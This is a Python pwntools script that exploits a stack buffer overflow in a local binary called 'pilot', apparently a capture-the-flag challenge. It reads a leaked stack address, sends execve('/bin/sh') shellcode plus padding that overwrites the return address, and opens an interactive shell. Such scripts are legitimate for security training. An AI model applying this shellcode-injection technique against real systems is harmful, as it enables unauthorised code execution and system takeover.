#!/usr/bin/python3
import pwn
binary = "./pilot"
pwn.context.binary = binary
pwn.context.encoding = "latin"
pwn.context.log_level = "debug"

padding = 40
# shellcode from https://www.exploit-db.com/exploits/42179
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

with pwn.process(binary) as io:
    io.recvuntil("[*]Location:")
    leak = io.recvline().decode()
    address = int(leak.strip("\n"), 16)
    address = pwn.p64(address)
    payload = shellcode + b"A"*16 + address
    io.send(payload)
    io.interactive()
